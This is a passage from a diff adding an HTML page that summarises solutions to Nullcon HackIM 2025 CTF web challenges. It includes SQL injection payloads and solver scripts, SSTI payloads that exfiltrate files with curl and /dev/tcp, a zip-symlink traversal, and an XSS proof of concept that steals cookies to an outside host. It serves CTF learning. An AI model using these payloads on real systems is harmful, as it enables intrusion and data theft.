+            background-color: #2d3436;
+            color: #dfe6e9;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+
+        #ctf-summary-container pre code {
+            background-color: transparent;
+            color: inherit;
+            padding: 0;
+        }
+
+        #ctf-summary-container a {
+            color: #2980b9;
+            text-decoration: none;
+        }
+
+        #ctf-summary-container a:hover {
+            text-decoration: underline;
+        }
+
+        #ctf-summary-container .explanation,
+        #ctf-summary-container .vulnerability {
+            margin-bottom: 10px;
+        }
+    </style>
+
+    <h2>Nullcon HackIM 2025 CTF: Web Challenge Solutions Summary</h2>
+    <p>This document summarizes the discussion, techniques, and solutions for various web challenges from the Nullcon 2025 CTF. The conversation covered a wide range of vulnerabilities including SQL Injection, insecure pseudo-random number generation, server-side template injection, cryptographic flaws, and path traversal.</p>
+
+    <div class="challenge">
+        <h3>Paginator &amp; Paginator V2</h3>
+        <div class="vulnerability"><strong>Vulnerability:</strong> SQL Injection</div>
+        <div class="explanation">
+            Two main approaches were discussed for this challenge. The first was a direct <code>UNION</code>-based SQL injection, possible because the original query's table had the same number of columns as the injection. The second was a blind, character-by-character exfiltration of the flag using the <code>GLOB</code> operator, which is case-sensitive and necessary for the base64-encoded flag.
+        </div>
+        <h4>Payloads:</h4>
+        <pre><code class="language-sql">-- Direct UNION Injection
+?p=2,2 UNION SELECT * FROM flag--
+
+-- Blind Injection (inside a script)
+or (select value from flag) GLOB '{GUESS_CHAR_HERE}*'</code></pre>
+        <h4>Python Solver (Blind Method):</h4>
+        <pre><code class="language-python">import requests as req
+import string
+
+url = "http://52.59.124.14:5015/?p=2,2"
+list_of_char = " "+string.ascii_letters+string.digits+"-=_"
+flag = ""
+
+for i in range(77):
+    print(f"Flag_so_far: {flag}")
+    for char in list_of_char:
+        temp = flag+char
+        payload = f" or (select value from flag) GLOB '{temp}*'"
+        response = req.get(url+payload)
+        if "Page 3 (ID=3) has content:" in response.text:
+            print(f"Found Char! {char}")
+            flag = temp
+            break</code></pre>
+        <p><strong>Reference:</strong> <a href="https://medium.com/@vspillai0701/paginator-v2-nullcon-ctf-2025-7bc5f8f445b4" target="_blank">Paginator v2 Writeup</a></p>
+    </div>
+
+    <div class="challenge">
+        <h3>Sess.io</h3>
+        <div class="vulnerability"><strong>Vulnerability:</strong> Insecure PRNG (PHP Mersenne Twister Seed Prediction)</div>
+        <div class="explanation">
+            The challenge involved predicting the seed used by PHP's <code>mt_rand()</code> function. The flag was split into 4-character chunks, and one of these chunks was used as the seed based on the MD5 hash of the user's credentials. By generating a session ID from the PRNG output, it was possible to reverse the process. The solution involved feeding ~30 characters of the session ID to the <code>php_mt_seed</code> tool to recover the seed, which corresponded to a part of the flag. This process was repeated for all possible chunks to reconstruct the full flag.
+        </div>
+        <h4>Python Solver:</h4>
+        <pre><code class="language-python">from multiprocessing.pool import Pool
+import subprocess
+import httpx
+import re
+
+url = 'http://52.59.124.14:5008'
+# ... (get_index mapping and alpha definition) ...
+alpha = 'abcdefghijklmnopqrstuvwxyz0123456789_-'
+count = len(alpha)
+
+def brute_chunk(i):
+    i = hex(i)[2:]
+    username, password = get_index[i]
+    cook = httpx.post(url, data={'username': username, 'password': password}).cookies.get('PHPSESSID')
+    idxs = [str(alpha.find(c)) for c in cook[:30]]
+    
+    # Use php_mt_seed to crack the seed from session ID characters
+    args = ['./php_mt_seed']
+    for x in idxs:
+        args.extend([x, x, "0", str(count-1)])
+    
+    p = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
+    
+    while True:
+        line = p.stdout.readline()
+        if line and b'PHP 7.1.0+' in line:
+            segment = re.search(r'seed = 0x(\w{8})', line.decode()).groups()[0]
+            decoded = bytes.fromhex(segment).decode()
+            return decoded
+        elif not line:
+            break
+# ... (multiprocessing logic to assemble the flag) ...
+</code></pre>
+        <p><strong>Tool:</strong> <a href="https://github.com/openwall/php_mt_seed" target="_blank">openwall/php_mt_seed</a></p>
+    </div>
+
+    <div class="challenge">
+        <h3>Temptation</h3>
+        <div class="vulnerability"><strong>Vulnerability:</strong> Server-Side Template Injection (SSTI)</div>
+        <div class="explanation">
+            The application used a vulnerable template engine (<code>web.template.Template</code>) that allowed arbitrary Python code execution. Payloads were crafted to use <code>__import__('os').system(...)</code> to run shell commands. This was used to read the flag file (e.g., <code>/tmp/fla*.txt</code>) and exfiltrate its contents via an outbound HTTP request to a controlled server (e.g., webhook, ngrok).
+        </div>
+        <h4>Example Payloads:</h4>
+        <pre><code class="language-python"># Payload to send flag to a webhook
+${__import__('os').system('curl+http://webhook/`cat+/tmp/f*.txt`')}
+
+# Payload to send base64-encoded flag to a server
+${__import__('os').system('curl+https://my_sever_ip_address/$(cat+/tmp/*|+base64)')}
+
+# Payload to establish a reverse shell
+${__import__('os').system('bash -c "cat /tmp/fla* > /dev/tcp/{ip}/{port}"')}
+</code></pre>
+    </div>
+
+    <div class="challenge">
+        <h3>Bfail</h3>
+        <div class="vulnerability"><strong>Vulnerability:</strong> Cryptographic Flaw (bcrypt 72-byte limitation)</div>
+        <div class="explanation">
+            The core of this challenge was the property that many <code>bcrypt</code> implementations only process the first 72 bytes of a password. A leaked password hash prefix (71 bytes) was provided. The solution was to brute-force the final (72nd) byte until <code>bcrypt.checkpw</code> returned true against the known hash.
+        </div>
+        <h4>Python Solver:</h4>
+        <pre><code class="language-python">import bcrypt
+import requests
+
+leak = b'\xec\x9f\xe0a\x978\xfc\xb6:T\xe2\xa0\xc9&lt;\x9e\x1a\xa5\xfao\xb2\x15\x86\xe5$\x86Z\x1a\xd4\xca#\x15\xd2x\xa0\x0e0\xca\xbc\x89T\xc5V6\xf1\xa4\xa8S\x8a%I\xd8gI\x15\xe9\xe7$M\x15\xdc @\xa9\xa1@\x9c\xeee\xe0\xe0\xf76'
+expected = b'$2b$12$8bMrI6D9TMYXeMv8pq8RjemsZg.HekhkQUqLymBic/cRhiKRa3YPK'
+
+i = 0
+while i &lt; 255:
+    if bcrypt.checkpw(leak + bytes([i]), expected):
+        print(f"last byte is (decimal) {i}")
+        # The correct last byte was 170 (0xaa)
+        break
+    i += 1
+</code></pre>
+    </div>
+
+    <div class="challenge">
+        <h3>zpr</h3>
+        <div class="vulnerability"><strong>Vulnerability:</strong> Path Traversal via Zip Symlinks</div>
+        <div class="explanation">
+            The application allowed file uploads and was vulnerable to path traversal when handling zip archives. The solution was to create a symbolic link pointing to the flag file (located at <code>../../../flag</code>), add this symlink to a zip file, and upload it. The server would follow the symlink upon extraction, allowing the flag to be read.
+        </div>
+        <h4>Shell Commands:</h4>
+        <pre><code class="language-bash"># 1. Create a symlink named 'x' pointing to the flag
+ln -sfn ../../../flag x
+
+# 2. Create a zip file containing the symlink
+zip a.zip x --symlink
+
+# 3. Upload the zip file
+curl -F "file=@a.zip" http://52.59.124.14:10015/
+</code></pre>
+    </div>
+
+    <div class="challenge">
+        <h3>Falafel Shop 2</h3>
+        <div class="vulnerability"><strong>Vulnerability:</strong> Stored Cross-Site Scripting (XSS)</div>
+        <div class="explanation">
+            A stored XSS vulnerability was present in the file upload functionality. A malicious payload could be injected into the filename of an uploaded file. The proof-of-concept involved using JavaScript to construct a <code>File</code> object with a crafted filename containing an SVG with an <code>onload</code> event handler.
+        </div>
+        <h4>HTML/JavaScript PoC:</h4>
+        <pre><code class="language-html">&lt;form action="http://localhost:5010/contest.php" method="POST" enctype="multipart/form-data"&gt;
+    &lt;input type="file" name="fileToUpload" id="fileToUpload"&gt;
+&lt;/form&gt;
+&lt;script&gt;
+    const file = new File(["foo"], "foo'&gt;&lt;svg onload=eval(atob('bG9jYXRpb249J2h0dHBzOi8vZWZlYXdzZGFzZGFzZGYuZnJlZS5iZWVjZXB0b3IuY29tLz9jPScrZG9jdW1lbnQuY29va2llOw=='))&gt;.jpg", {
+        type: "image/jpeg",
+    });
+    const dataTransfer = new DataTransfer();
+    dataTransfer.items.add(file);
+    document.forms[0].children[0].files = dataTransfer.files;
+    document.forms[0].submit();
+&lt;/script&gt;</code></pre>
+    </div>
+
+    <div class="challenge">
+        <h3>Other Notable Challenges &amp; Links</h3>
+        <ul>
+            <li><strong>zoney:</strong> An info disclosure vulnerability where visiting <code>/?source=1</code> leaked the source code due to a faulty truthiness check. Writeup: <a href="https://blog.n0va.in/posts/nullcon-writeup/" target="_blank">n0va.in blog</a>.</li>
+            <li><strong>traversaller:</strong> A path traversal solved using a <code>php://filter</code> stream wrapper to read and base64-encode the flag file.</li>
+            <li><strong>AWS S3 Misconfiguration:</strong> AWS credentials were found in a publicly readable <code>.boto</code> file within an S3 bucket (<code>nullcon-static-content-public-bucket</code>) linked from the website.</li>
+            <li><strong>General Security Resources:</strong> Numerous links were shared, including writeups for previous nullcon CTFs, articles on various vulnerabilities (SSRF, XSS, SQLi, RCE) from authors like <a href="https://shahjerry33.medium.com/" target="_blank">shahjerry33</a>, and documentation from PortSwigger and Python.org.</li>
+        </ul>
+    </div>
+
+</div>
+  </section>
+  <script>
+    // Force chat to start at the bottom (newest messages)
+    const chat = document.getElementById("chat");
+    chat.scrollTop = chat.scrollHeight;
+  </script>
+</body>
+</html>
